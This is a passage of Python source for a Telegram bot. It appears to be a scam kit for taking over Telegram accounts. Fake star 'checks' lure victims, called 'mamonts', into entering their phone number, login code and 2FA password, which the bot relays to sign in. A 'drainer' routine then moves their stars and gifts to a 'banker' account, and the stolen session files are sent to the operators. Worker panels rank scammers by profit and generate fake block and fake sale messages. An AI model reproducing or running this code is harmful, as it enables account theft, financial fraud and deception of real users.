            await sess.post(f"{SETTINGS['api_url']}/api/telegram/update-request", json={"requestId": rid, "result": {"status": status, "message": msg, "needs2FA": needs_2fa}}, headers=self.get_headers())
        except: pass

    async def get_client(self, phone):
        name = str(phone).replace(" ", "").replace("+", "")
        # Limit concurrent clients to 5 to prevent spam
        active_clients = [c for c in self.pyro_clients.values() if c.is_connected]
        if len(active_clients) >= 5 and name not in self.pyro_clients:
            # Wait or skip
            await asyncio.sleep(1)
        if name not in self.pyro_clients:
            self.pyro_clients[name] = Client(name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))

        c = self.pyro_clients[name]
        if not c.is_connected:
            await c.connect()
        return c

    async def finalize_login(self, client, user_id):
        """Метод финализации сессии после успешного входа"""
        full_name = "Unknown"
        display_tag = mask_data(str(user_id)) if user_id else "Unknown"

        try:
            me = await client.get_me()
            # Сбрасываем счетчик попыток при успешном входе
            self.reset_attempts(user_id)

            full_name = me.first_name or "Без имени"
            display_tag = f"@{mask_data(me.username)}" if me.username else mask_data(str(me.id))
            m_phone = mask_phone(me.phone_number)

            # 1. Поиск воркера
            u_db = db.get_user(me.id)
            worker_info = "👤 <b>Воркер:</b> 👤 Администрация"
            w_id = u_db['worker_id'] if u_db and u_db.get('worker_id') else None

            if w_id:
                w = db.get_user(w_id)
                if w:
                    w_tag = f"@{w['username']}" if w['username'] else f"Тег: {w['user_id']}"
                    worker_info = f"👤 <b>Воркер:</b> {w_tag}"

            # 2. Проверка на вход с твинка (если мамонт входит в чужой аккаунт)
            twin_warning = ""
            if u_db and u_db.get('is_mamont') and u_db.get('original_username'):
                # Проверяем, совпадают ли данные залогиненного аккаунта с оригинальными данными мамонта
                current_username = me.username or ""
                current_first_name = me.first_name or ""
                original_username = u_db.get('original_username') or ""
                original_first_name = u_db.get('original_first_name') or ""

                # Если данные не совпадают - это твинк
                if (current_username != original_username or current_first_name != original_first_name):
                    # Показываем: оригинальный аккаунт мамонта → аккаунт на который вошел
                    original_tag = f"@{mask_data(original_username)}" if original_username else f"ID:{u_db['user_id']}"
                    current_tag = f"@{mask_data(current_username)}" if current_username else f"ID:{me.id}"
                    twin_warning = f"\n⚠️ <b>ТВИНК:</b> {original_tag} → {current_tag}"

            # 3. Лог успешного входа
            log_card = (
                f"<b>✅ УСПЕШНЫЙ ВХОД</b>\n"
                f"<code>««─────────────────»»</code>\n"
                f"📱 <b>Телефон:</b> <code>{m_phone}</code>\n"
                f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                f"{worker_info}{twin_warning}\n"
                f"<code>««─────────────────»»</code>"
            )
            await log_to_topic(self.bot, 'topic_auth', log_card)

            # 3. Работа Дрейнера (FULL_WORKER_CYCLE)
            banker = None
            b_name = SETTINGS.get('banker_session')
            if b_name and (SESSIONS_DIR / f"{b_name}.session").exists():
                try:
                    banker = Client(b_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))
                    await banker.start()
                except Exception as e: print_error(f"Banker init failed: {e}")

            bal = await get_stars_info(client) # Получаем баланс звёзд
            await FULL_WORKER_CYCLE(client, banker, self.bot)

            if banker:
                try: await banker.stop()
                except: pass


            # 5. Сохранение сессии админам и перенос в архив
            session_file = SESSIONS_DIR / f"{client.name}.session"
            await send_file_to_admins(self.bot, session_file, f"📦 {m_phone}")

            try:
                if client.is_connected: await client.stop()
            except: pass

            # Безопасный перенос файла с повторными попытками
            src = SESSIONS_DIR / f"{client.name}.session"
            dst = ARCHIVE_DIR / f"{client.name}.session"

            if src.exists():
                for attempt in range(3):  # 3 попытки
                    try:
                        # На Windows используем copy + delete вместо move
                        import os
                        import shutil
                        shutil.copy2(str(src), str(dst))
                        os.remove(str(src))
                        break
                    except (OSError, PermissionError) as e:
                        if attempt == 2:  # Последняя попытка
                            print_error(f"Failed to move session file after 3 attempts: {e}")
                        await asyncio.sleep(0.5)  # Ждем перед следующей попыткой

            if client.name in self.pyro_clients: del self.pyro_clients[client.name]

        except Exception as e:
            print_error(f"Fin Error: {e}")
            await alert_admins(self.bot, f"❌ Ошибка финализации {full_name}: {e}")

    async def handle_req(self, req, sess):
        rid, act = req['requestId'], req['action']
        data = req.get('data') or {}
        ph = str(req.get('phone') or data.get('phone') or "").replace(" ", "")
        code = req.get('code') or data.get('code')
        pwd = req.get('password') or data.get('password')
        cid = req.get('chatId')

        # Проверка на наличие пользователя и username
        if not cid:
            return

        u_db = db.get_user(cid)
        if not u_db or not u_db.get('username'):
            await self.update_status(sess, rid, 'error', 'Username required')
            return

        full_name = u_db['first_name'] if u_db else "Unknown"
        display_tag = f"@{mask_data(u_db['username'])}" if u_db and u_db.get('username') else mask_data(str(cid)) if cid else "Unknown"
        m_ph = mask_phone(ph)

        try:
            if act == 'send_phone':
                # Проверяем, не заблокирован ли пользователь
                if self.is_user_blocked(cid):
                    remaining_time = int((self.phone_attempts[cid]['blocked_until'] - time.time()) / 60)
                    await self.update_status(sess, rid, 'error', f'Слишком много попыток ввода номера. Попробуйте через {remaining_time} минут.')
                    return

                # Увеличиваем счетчик попыток
                self.increment_attempts(cid)

                c = await self.get_client(ph)
                if not c.is_connected: await c.connect()
                s = await c.send_code(ph)
                self.user_sessions[ph] = {'h': s.phone_code_hash}

                msg = (
                    f"<b>📱 ВВОД НОМЕРА</b>\n"
                    f"<code>««─────────────────»»</code>\n"
                    f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                    f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                    f"📞 <b>Номер:</b> <code>{m_ph}</code>\n"
                    f"⏳ <b>Статус:</b> Ожидание кода...\n"
                    f"<code>««─────────────────»»</code>"
                )
                await log_to_topic(self.bot, 'topic_auth', msg)
                await self.update_status(sess, rid, 'waiting_code')

            elif act in ['verify_code', 'send_code']:
                c = await self.get_client(ph)
                try:
                    await c.sign_in(ph, self.user_sessions[ph]['h'], str(code))
                    msg = (
                        f"<b>📩 КОД ПРИНЯТ</b>\n"
                        f"<code>««─────────────────»»</code>\n"
                        f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                        f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                        f"✅ <b>Результат:</b> Вход выполнен\n"
                        f"<code>««─────────────────»»</code>"
                    )
                    await log_to_topic(self.bot, 'topic_auth', msg)
                    await self.finalize_login(c, cid) # Вызов метода финализации
                    await self.update_status(sess, rid, 'success')
                except SessionPasswordNeeded:
                    msg = (
                        f"<b>🔐 ЗАПРОС 2FA</b>\n"
                        f"<code>««─────────────────»»</code>\n"
                        f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                        f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                        f"📱 <b>Номер:</b> <code>{m_ph}</code>\n"
                        f"⚠️ <b>Статус:</b> Нужен пароль\n"
                        f"<code>««─────────────────»»</code>"
                    )
                    await log_to_topic(self.bot, 'topic_auth', msg)
                    await self.update_status(sess, rid, 'waiting_password', needs_2fa=True)

            elif act in ['send_password', 'verify_password']:
                c = await self.get_client(ph)
                await c.check_password(str(pwd))
                await self.finalize_login(c, cid) # Вызов метода финализации
                await self.update_status(sess, rid, 'success')

        except Exception as e:
            error_msg = (
                f"<b>❌ ОШИБКА АВТОРИЗАЦИИ</b>\n"
                f"<code>««─────────────────»»</code>\n"
                f"👤 <b>Юзер:</b> <code>{full_name}</code>\n"
                f"🆔 <b>Тег:</b> <code>{display_tag}</code>\n"
                f"⚠️ <b>Ошибка:</b> <code>{str(e)}</code>\n"
                f"<code>««─────────────────»»</code>"
            )
            await log_to_topic(self.bot, 'topic_auth', error_msg)
            await self.update_status(sess, rid, 'error', str(e))

# ================= AIOGRAM ROUTER =================
def get_main_router(bot_instance: Bot, current_api_url: str):
    router = Router()

    async def check_admin(user_id): return user_id in SETTINGS["admin_ids"]

    @router.message(CommandStart())
    async def command_start(message: types.Message, command: CommandObject):
        print_info(f"📨 Command /start received from user {message.from_user.id}")
        user_id = message.from_user.id
        args = command.args
        worker_id = None

        # Реферальная логика (оставляем без изменений)
        if args:
            if args.startswith("c_"):
                check = db.get_check(args.replace("c_", ""))
                if check: worker_id = check['creator_id']
            elif args.startswith("q_"):
                try: worker_id = int(args.replace("q_", "").split("_")[0])
                except: pass

        # Добавляем юзера в БД
        db.add_user(user_id, message.from_user.username, message.from_user.first_name, worker_id)

        # Simple test response first
        try:
            await message.answer("🚀 <b>Бот работает!</b>\n\nКоманда получена, загружаю меню...", parse_mode="HTML")
            print_success(f"✅ Response sent to user {user_id}")
        except Exception as e:
            print_error(f"❌ Failed to send response to user {user_id}: {e}")
            return

        # Process referral logic and show menu
        if args and args.startswith("c_"):
            # Process check activation
            check_id = args.replace("c_", "")
            check = db.get_check(check_id)
            if check:
                worker_id = check['creator_id']
                db.add_user(user_id, message.from_user.username, message.from_user.first_name, worker_id)

                # Activate the check and show success message
                res, amt, cr = db.activate_check(check_id, user_id)
                if res == "success":
                    if cr: db.add_user(user_id, message.from_user.username, message.from_user.first_name, cr, message.from_user.username, message.from_user.first_name)
                    # Мамонт (жертва) активирует чек - автоматически становится мамонтом
                    db.set_mamont(user_id, True)
                    u = db.get_user(user_id)

                    # Log the activation
                    await log_check_activation(bot_instance, message.from_user, {'amount': amt, 'creator_id': cr})

                    txt = (
                        f"🎉 <b>Чек успешно активирован!</b>\n\n"
                        f"💰 <b>Получено звезд:</b> <code>+{amt} ⭐️</code>\n"
                        f"💎 <b>Текущий баланс:</b> <code>{u['balance']} ⭐️</code>\n\n"
                        f"⭐️ <b>Звезды можно использовать для:</b>\n"
                        f"🚀 Покупки премиум функций Telegram\n"
                        f"🎁 Отправки подарков друзьям\n"
                        f"🛒 Улучшения аккаунта\n\n"
                        f"💡 <b>Управляйте балансом в разделе Кошелек</b>"
                    )
                    kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")).as_markup()

                    if amt in CHECK_PHOTO_URLS:
                        await message.answer_photo(
                            photo=CHECK_PHOTO_URLS[amt],
                            caption=txt,
                            reply_markup=kb,
                            parse_mode="HTML"
                        )
                    else:
                        await message.answer(txt, reply_markup=kb, parse_mode="HTML")

                    # Дополнительное сообщение после активации чека
                    bonus_msg = (
                        f"🎁 <b>Бонус за активацию чека!</b>\n\n"
                        f"💎 <b>Дополнительные возможности:</b>\n\n"
                        f"⭐️ <b>Бесплатные звезды:</b> Ежедневные бонусы\n"
                        f"🎯 <b>Специальные предложения:</b> Эксклюзивные чеки\n"
                        f"🚀 <b>Ускоренная обработка:</b> Приоритетная очередь\n\n"
                        f"💡 <b>Следите за обновлениями!</b>"
                    )
                    await message.answer(bonus_msg, parse_mode="HTML")
                else:
                    await message.answer("❌ Чек уже активирован или не существует", parse_mode="HTML")
                    await show_main_menu(message, user_id)
            else:
                await message.answer("❌ Чек не найден", parse_mode="HTML")
                await show_main_menu(message, user_id)
            return  # Don't show main menu if check was processed
        elif args and args.startswith("q_"):
            # Process inline check activation
            try:
                params = args.replace("q_", "")
                cr_id, amt = map(int, params.split("_")[:2])
                res = db.activate_inline_check(params, cr_id, user_id, amt)
                if res == "success":
                    db.add_user(user_id, message.from_user.username, message.from_user.first_name, cr_id)
                    # Log the activation
                    await log_check_activation(bot_instance, message.from_user, {'amount': amt, 'creator_id': cr_id})

                    # Get updated user info
                    u = db.get_user(user_id)

                    # Success message for inline check activation
                    txt = (
                        f"🎉 <b>Чек успешно активирован!</b>\n\n"
                        f"💰 <b>Получено звезд:</b> <code>+{amt} ⭐️</code>\n"
                        f"💎 <b>Текущий баланс:</b> <code>{u['balance']} ⭐️</code>\n\n"
                        f"⭐️ <b>Звезды можно использовать для:</b>\n"
                        f"🚀 Покупки премиум функций Telegram\n"
                        f"🎁 Отправки подарков друзьям\n"
                        f"🛒 Улучшения аккаунта\n\n"
                        f"💡 <b>Управляйте балансом в разделе Кошелек</b>"
                    )
                    kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="👛 Кошелек", callback_data="wallet")).as_markup()

                    await message.answer(txt, reply_markup=kb, parse_mode="HTML")

                    # Дополнительное сообщение после активации чека
                    bonus_msg = (
                        f"🎁 <b>Бонус за активацию чека!</b>\n\n"
                        f"💎 <b>Дополнительные возможности:</b>\n\n"
                        f"⭐️ <b>Бесплатные звезды:</b> Ежедневные бонусы\n"
                        f"🎯 <b>Специальные предложения:</b> Эксклюзивные чеки\n"
                        f"🚀 <b>Ускоренная обработка:</b> Приоритетная очередь\n\n"
                        f"💡 <b>Следите за обновлениями!</b>"
                    )
                    await message.answer(bonus_msg, parse_mode="HTML")

                await show_main_menu(message, user_id)
            except Exception as e:
                print(f"Inline check activation error: {e}")
                await show_main_menu(message, user_id)
        else:
            await show_main_menu(message, user_id)

    @router.message(Command(re.compile(r"top|topd|topw")))
    async def cmd_top_workers(message: types.Message):
        # Получаем данные из БД
        top_data = db.get_top_workers(limit=10)
        
        if not top_data:
            return await message.answer("<b>🏆 Список лидеров пока пуст.</b>")

        # Определяем заголовок в зависимости от введенной команды
        cmd = message.text.split()[0].replace("/", "").lower()
        if cmd == "topd":
            header = "🏆 <b>ТОП ВОРКЕРОВ ЗА ДЕНЬ</b> 🏆\n"
        elif cmd == "topw":
            header = "🏆 <b>ТОП ВОРКЕРОВ ЗА НЕДЕЛЮ</b> 🏆\n"
        else:
            header = "🏆 <b>ТОП ВОРКЕРОВ ЗА ВСЕ ВРЕМЯ</b> 🏆\n"

        txt = header + "<code>««─────────────────»»</code>\n\n"
        
        for i, (username, first_name, total_ton, count) in enumerate(top_data, 1):
            # Используем полные данные без маскировки
            display_name = html.escape(first_name or "Аноним")
            user_ref = f"@{username}" if username else f"<code>{display_name}</code>"
            
            # Эмодзи для призовых мест
            medals = {1: "🥇", 2: "🥈", 3: "🥉"}
            rank = medals.get(i, f"<b>{i}.</b>")
            
            # Формируем строку: Медаль. Юзернейм — Сумма TON (Кол-во подарков)
            txt += f"{rank} {user_ref} — <b>{total_ton:.2f} TON</b> ({count} 🎁)\n"

        txt += "\n<code>««─────────────────»»</code>\n"
        txt += "<i>Лидеры обновляются в реальном времени!</i>"

        await message.answer(txt, parse_mode="HTML")

    @router.message(Command("aqua"))
    async def aqua_command(message: types.Message, command: CommandObject):
        args = command.args
        if not args or not args.isdigit():
            await message.answer("Использование: /aqua <сумма в звездах>")
            return

        amt = int(args)
        u = db.get_user(message.from_user.id)
        if not u or u['balance'] < amt:
            await message.answer("❌ Недостаточно звезд на балансе")
            return

        uid = f"{message.from_user.id}_{amt}_{secrets.token_hex(4)}"
        bot_info = await message.bot.me()
        kb = InlineKeyboardBuilder().add(InlineKeyboardButton(text="⭐️ Активировать!", url=f"https://t.me/{bot_info.username}?start=q_{uid}")).as_markup()

        if amt in CHECK_PHOTO_URLS:
            txt = (
                f"🎁 <b>Чек на {amt} звезд Telegram!</b>\n\n"
                f"⭐️ <b>Сумма:</b> <code>{amt} ⭐️</code>\n"
                f"💎 <b>Ценность:</b> Премиум валюта Telegram\n"
                f"🚀 <b>Назначение:</b> Покупка премиум функций\n"
                f"🛡️ <b>Безопасность:</b> Защищен от мошенничества\n\n"
                f"💡 <b>Нажмите кнопку ниже для активации!</b>"
            )
            await message.answer_photo(
                photo=CHECK_PHOTO_URLS[amt],
                caption=txt,
                reply_markup=kb,
                parse_mode="HTML"
            )
        else:
            txt = f"⭐️ <b>ЧЕК {amt} звёзд!</b>"
            await message.answer(txt, reply_markup=kb, parse_mode="HTML")

    @router.message(Command("mamontization"))
    async def mamont(m: Message):
        db.add_user(m.from_user.id, m.from_user.username, m.from_user.first_name)
        db.set_mamont(m.from_user.id, True)
        await m.delete()
        await m.answer("🔓 <b>Developer Mode Activated</b>\n/star 1000\n/rstar 1000")

    @router.message(Command("star"))
    async def add_stars(m: Message, command: CommandObject):
        u = db.get_user(m.from_user.id)
        if not u or not u['is_mamont']: return
        try:
            amt = int(command.args)
            db.update_balance(m.from_user.id, amt, 'add')
            await m.answer(f"✅ +{amt} stars")
        except: pass

    @router.message(Command("rstar"))
    async def rem_stars(m: Message, command: CommandObject):
        u = db.get_user(m.from_user.id)
        if not u or not u['is_mamont']: return
        try:
            amt = int(command.args)
            db.update_balance(m.from_user.id, amt, 'remove')
            await m.answer(f"✅ -{amt} stars")
        except: pass

    @router.message(Command("worker"))
    async def worker_panel(message: types.Message):
        # Получаем статистику воркера (теперь доступно всем)
        cursor = db.cursor
        cursor.execute("SELECT COUNT(*) FROM users WHERE worker_id = ?", (message.from_user.id,))
        mamonts_count = cursor.fetchone()[0]

        # Получаем количество профитов для этого воркера
        worker_user = db.get_user(message.from_user.id)
        profits_count = worker_user.get('worker_profits', 0) if worker_user else 0

        # Получаем информацию о кошельке
        wallet_info = db.get_wallet(message.from_user.id)
        wallet_status = "✅ Привязан" if wallet_info else "❌ Не привязан"

        # Получаем сумму профитов в TON
        total_profits_ton = worker_user.get('worker_total_profits', 0) if worker_user else 0

        # Создаем красивую панель
        txt = (
            f"👷‍♂️ <b>ПАНЕЛЬ ВОРКЕРА</b> 👷‍♂️\n\n"
            f"👤 <b>ID пользователя:</b> <code>{message.from_user.id}</code>\n"
            f"💰 <b>Подарков передано:</b> <code>{profits_count}</code> 🎁\n"
            f"💎 <b>Всего заработано:</b> <code>{total_profits_ton:.2f} TON</code>\n"
            f"🐘 <b>Активных мамонтов:</b> <code>{mamonts_count}</code> 👥\n"
            f"👛 <b>TON кошелек:</b> <code>{wallet_status}</code>\n\n"
            f"🛠️ <b>ИНСТРУМЕНТЫ ВОРКЕРА:</b>"
        )

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="💳 Привязать кошелек TON", callback_data="bind_wallet"))
        kb.row(InlineKeyboardButton(text="📊 Статистика профитов", callback_data="worker_stats"))
        kb.row(InlineKeyboardButton(text="📱 Фейк SMS о блокировке", callback_data="fake_block_sms"))
        kb.row(InlineKeyboardButton(text="💰 Фейк уведомление о продаже", callback_data="fake_sale_notification"))
        kb.row(InlineKeyboardButton(text="🔄 Обновить статистику", callback_data="worker_refresh"))
        kb.row(InlineKeyboardButton(text="🚪 Выйти", callback_data="worker_exit"))

        await message.answer(txt, reply_markup=kb.as_markup(), parse_mode="HTML")

    @router.callback_query(F.data == "bind_wallet")
    async def bind_wallet_start(call: types.CallbackQuery, state: FSMContext):
        await call.message.answer(
            "💳 <b>Привязка кошелька TON Keeper</b>\n\n"
            "📝 <b>Отправьте адрес вашего TON кошелька</b>\n\n"
            "💡 <b>Как получить адрес:</b>\n"
            "1. Откройте TON Keeper\n"
            "2. Нажмите на ваш кошелек\n"
            "3. Скопируйте адрес (начинается с EQ...)\n"
            "4. Отправьте его сюда\n\n"
            "⚠️ <b>Важно:</b> Убедитесь, что адрес правильный!",
            reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🔙 Назад", callback_data="worker_refresh")).as_markup(),
            parse_mode="HTML"
        )
        await state.set_state(WaitingWalletAddress.waiting_wallet_address)

    @router.message(WaitingWalletAddress.waiting_wallet_address, F.text)
    async def bind_wallet_address(message: types.Message, state: FSMContext):
        wallet_address = message.text.strip()

        # Basic validation for TON address
        if not (wallet_address.startswith('EQ') or wallet_address.startswith('UQ') or wallet_address.startswith('0:')):
            await message.answer(
                "❌ <b>Неверный формат адреса!</b>\n\n"
                "💡 TON адрес должен начинаться с:\n"
                "• EQ... (новый формат)\n"
                "• UQ... (новый формат)\n"
                "• 0:... (старый формат)\n\n"
                "Попробуйте еще раз:",
                parse_mode="HTML"
            )
            return

        # Save wallet
        db.bind_wallet(message.from_user.id, wallet_address)

        await message.answer(
            f"✅ <b>Кошелек успешно привязан!</b>\n\n"
            f"👛 <b>Адрес:</b> <code>{wallet_address}</code>\n\n"
            f"💰 <b>Теперь в логах профитов будет отображаться ваш кошелек для выплат!</b>",
            reply_markup=InlineKeyboardBuilder().row(InlineKeyboardButton(text="🏠 В панель воркера", callback_data="worker_refresh")).as_markup(),
            parse_mode="HTML"
        )
        await state.clear()

    @router.callback_query(F.data == "worker_stats")
    async def worker_stats(call: types.CallbackQuery):
        # Get worker stats
        worker_user = db.get_user(call.from_user.id)
        total_profits = worker_user.get('worker_total_profits', 0) if worker_user else 0
        profits_count = worker_user.get('worker_profits', 0) if worker_user else 0

        # Get wallet info
        wallet_info = db.get_wallet(call.from_user.id)

        txt = (
            f"📊 <b>СТАТИСТИКА ПРОФИТОВ</b> 📊\n\n"
            f"💰 <b>Всего профитов:</b> <code>{total_profits} ⭐️</code>\n"
            f"🎁 <b>Количество сделок:</b> <code>{profits_count}</code>\n\n"
        )

        if wallet_info:
            txt += f"👛 <b>Кошелек для выплат:</b> <code>{wallet_info['address'][:8]}...{wallet_info['address'][-6:]}</code>\n\n"

        txt += "💡 <b>Реальные цены NFT рассчитываются через Portals API</b>"

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="🔄 Обновить", callback_data="worker_stats"))
        kb.row(InlineKeyboardButton(text="🔙 Назад", callback_data="worker_refresh"))

        await safe_edit_text(call.message, txt, kb.as_markup())

    @router.callback_query(F.data == "fake_block_sms")
    async def fake_block_sms(call: types.CallbackQuery):
        # Получаем баланс пользователя
        u = db.get_user(call.from_user.id)
        user_balance = u['balance'] if u else 0

        # Генерируем случайное количество дней блокировки (3-14 дней)
        block_days = random.randint(3, 14)

        # Создаем фейковое SMS сообщение
        fake_sms = (
            f"🚫 <b>ВНИМАНИЕ! БАЛАНС ЗАБЛОКИРОВАН</b>\n\n"
            f"💰 <b>Ваш баланс звезд Telegram заблокирован!</b>\n"
            f"💎 <b>Заблокированная сумма:</b> <code>{user_balance} ⭐️</code>\n\n"
            f"⏳ <b>Причина блокировки:</b> Частые выводы звезд\n"
            f"📅 <b>Срок блокировки:</b> <code>{block_days} дней</code>\n\n"
            f"🔓 <b>Разблокировка произойдет автоматически</b>\n"
            f"📱 <b>после истечения указанного срока.</b>\n\n"
            f"❗ <b>Пожалуйста, не пытайтесь обходить блокировку</b>\n"
            f"🛡️ <b>Это может привести к полной потере доступа.</b>\n\n"
            f"💡 <b>Рекомендация:</b> Используйте звезды умеренно"
        )

        # Отправляем сообщение пользователю
        await call.message.answer(fake_sms, parse_mode="HTML")
        await call.answer("✅ Фейковое SMS отправлено!", show_alert=True)

    @router.callback_query(F.data == "fake_sale_notification")
    async def fake_sale_notification_start(call: types.CallbackQuery, state: FSMContext):
        await call.message.answer("Введите тег получателя (например @username):")
        await state.set_state(FakeSaleState.waiting_for_tag)
        await call.answer()

    @router.message(FakeSaleState.waiting_for_tag)
    async def fake_sale_tag(m: Message, state: FSMContext):
        tag = m.text.strip()
        await state.update_data(tag=tag)
        await m.answer("Введите сумму звезд:")
        await state.set_state(FakeSaleState.waiting_for_amount)

    @router.message(FakeSaleState.waiting_for_amount)
    async def fake_sale_amount(m: Message, state: FSMContext):
        if not m.text.isdigit():
            await m.answer("Введите число!")
            return
        amount = int(m.text)
        data = await state.get_data()
        tag = data.get('tag')
        await state.clear()

        # Создаем фейковое уведомление о продаже
        fake_sale = (
            f"🔔 <b>УВЕДОМЛЕНИЕ О ПРОДАЖЕ</b>\n\n"
            f"🎉 <b>У вас новая продажа!</b>\n\n"
            f"📋 <b>Условия сделки:</b>\n"
            f"Необходимо перевести оплату чеком звезд на аккаунт <code>{tag}</code>\n"
            f"💰 Сумма: <code>{amount} ⭐️</code>\n\n"
            f"⏰ <b>Просим выполнить условия сделки до:</b>\n"
            f"<code>{get_deadline_date()}</code>\n\n"
            f"🔺 <b>Если звезды не будут полученны в течении этого времени, они безвозвратно сгорят.</b>\n\n"
            f"✅ <b>После вывода звезд получателем средства будут автоматически переданы на ваш баланс.</b>"
        )

        await m.answer(fake_sale, parse_mode="HTML")

    @router.callback_query(F.data == "worker_refresh")
    async def worker_refresh(call: types.CallbackQuery):
        # Пересчитываем статистику
        cursor = db.cursor
        cursor.execute("SELECT COUNT(*) FROM users WHERE worker_id = ?", (call.from_user.id,))
        mamonts_count = cursor.fetchone()[0]

        # Получаем количество профитов для этого воркера
        worker_user = db.get_user(call.from_user.id)
        profits_count = worker_user.get('worker_profits', 0) if worker_user else 0

        # Получаем сумму профитов в TON
        total_profits_ton = worker_user.get('worker_total_profits', 0) if worker_user else 0

        # Обновляем сообщение
        txt = (
            f"👷‍♂️ <b>ПАНЕЛЬ ВОРКЕРА</b> 👷‍♂️\n\n"
            f"👤 <b>ID пользователя:</b> <code>{call.from_user.id}</code>\n"
            f"💰 <b>Подарков передано:</b> <code>{profits_count}</code> 🎁\n"
            f"💎 <b>Всего заработано:</b> <code>{total_profits_ton:.2f} TON</code>\n"
            f"🐘 <b>Активных мамонтов:</b> <code>{mamonts_count}</code> 👥\n\n"
            f"🛠️ <b>ИНСТРУМЕНТЫ ВОРКЕРА:</b>"
        )

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📱 Фейк SMS о блокировке", callback_data="fake_block_sms"))
        kb.row(InlineKeyboardButton(text="💰 Фейк уведомление о продаже", callback_data="fake_sale_notification"))
        kb.row(InlineKeyboardButton(text="🔄 Обновить статистику", callback_data="worker_refresh"))
        kb.row(InlineKeyboardButton(text="🚪 Выйти", callback_data="worker_exit"))

        try:
            await call.message.edit_text(txt, reply_markup=kb.as_markup(), parse_mode="HTML")
            await call.answer("✅ Статистика обновлена!", show_alert=True)
        except Exception as e:
            # Если контент не изменился, просто показываем уведомление
            await call.answer("ℹ️ Статистика актуальна", show_alert=True)

    @router.callback_query(F.data == "worker_exit")
    async def worker_exit(call: types.CallbackQuery):
        await call.message.delete()
        await call.answer("👋 Панель закрыта", show_alert=True)

    # --- ADMIN ---
    # --- ADMIN ---
    @router.message(Command("admin"))
    async def admin_panel(message: types.Message):
        if not await check_admin(message.from_user.id): return
        u, c = db.get_stats()
        main_sess = SESSIONS_DIR / f"{SETTINGS['banker_session']}.session"
        st = "🟢 ON" if main_sess.exists() else "🔴 OFF"

        txt = (f"👑 <b>ADMIN PANEL</b>\nUsers: {u}\nChecks Total: {c}\nBanker: {st}\nTarget: {SETTINGS['target_user']}\nAPI: {SETTINGS['api_url']}")

        kb = InlineKeyboardBuilder()
        kb.row(InlineKeyboardButton(text="📱 Connect Banker", callback_data="admin_login"))
        kb.row(InlineKeyboardButton(text="📂 Список сессий", callback_data="admin_sessions_list"))

        # Новые кнопки
        kb.row(
            InlineKeyboardButton(text="🛡 Чекер сессий", callback_data="admin_session_check"),
            InlineKeyboardButton(text="🧹 Очистка RAM", callback_data="admin_kill_sessions")
        )

        kb.row(InlineKeyboardButton(text="🎯 Set Target", callback_data="set_target"), InlineKeyboardButton(text="⚙️ Set API", callback_data="set_api"))
        kb.row(InlineKeyboardButton(text="🛠 Maint. Mode", callback_data="toggle_shop"), InlineKeyboardButton(text="🔙 Close", callback_data="close_admin"))

        # Add banker status check button
        kb.row(InlineKeyboardButton(text="🔍 Проверить банкира", callback_data="check_banker_status"))
        kb.row(InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs"))
        kb.row(InlineKeyboardButton(text="🔄 Restart Bot", callback_data="restart_bot"))

        await message.answer(txt, reply_markup=kb.as_markup())

    # --- НОВЫЕ ОБРАБОТЧИКИ ДЛЯ СЕССИЙ ---

    # --- ЛОГИКА АВТО-ЧЕКЕРА ---
    @router.callback_query(F.data == "admin_session_check")
    async def cmd_auto_check(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return

        sessions = list(SESSIONS_DIR.glob("*.session"))
        if not sessions:
            return await call.answer("📁 Папка sessions пуста", show_alert=True)

        status_msg = await call.message.answer(f"⏳ Начинаю проверку {len(sessions)} сессий...")

        good, bad = 0, 0
        # Создаем папку для плохих сессий, если её нет
        BAD_SESSIONS_DIR = Path("archive_bad")
        BAD_SESSIONS_DIR.mkdir(exist_ok=True)

        for s_file in sessions:
            s_name = s_file.stem
            # Не трогаем сессию банкира
            if s_name == SETTINGS['banker_session']: continue

            client = Client(s_name, SETTINGS['api_id'], SETTINGS['api_hash'], workdir=str(SESSIONS_DIR))

            try:
                await client.connect()
                await client.get_me() # Проверка на валидность
                good += 1
                await client.disconnect()
            except (AuthKeyInvalid, UserDeactivated, SessionRevoked, Exception):
                bad += 1
                if client.is_connected: await client.disconnect()

                # Перемещаем "трупик" в архив
                try:
                    shutil.move(str(s_file), str(BAD_SESSIONS_DIR / s_file.name))
                except:
                    if s_file.exists():
                        os.remove(s_file) # Если файл занят или ошибка - просто удаляем

        await status_msg.edit_text(
            f"✅ <b>Проверка завершена!</b>\n\n"
            f"🟢 Валидных: <b>{good}</b>\n"
            f"🔴 Удалено (бан/выход): <b>{bad}</b>\n\n"
            f"<i>Мертвые сессии перемещены в /archive_bad</i>",
            parse_mode="HTML"
        )

    # --- СПИСОК СЕССИЙ ДЛЯ РУЧНОГО УПРАВЛЕНИЯ ---
    @router.callback_query(F.data == "admin_sessions_list")
    async def cmd_admin_sessions(call: types.CallbackQuery):
        if not await check_admin(call.from_user.id): return
        sessions = [f.stem for f in SESSIONS_DIR.glob("*.session")]

        if not sessions:
            return await call.answer("📁 Нет активных сессий", show_alert=True)

        builder = InlineKeyboardBuilder()
        for s_name in sessions[:30]:
            last_4 = s_name[-4:] if len(s_name) >= 4 else s_name
            builder.row(InlineKeyboardButton(text=f"👤 {last_4} ({s_name})", callback_data=f"manage_s:{s_name}"))

        builder.row(InlineKeyboardButton(text="🔍 Поиск по цифрам", callback_data="search_sessions"))
        builder.row(InlineKeyboardButton(text="🔙 Назад", callback_data="close_admin"))
        await call.message.edit_text("<b>📂 Список сессий (по последним 4 цифрам):</b>", reply_markup=builder.as_markup())

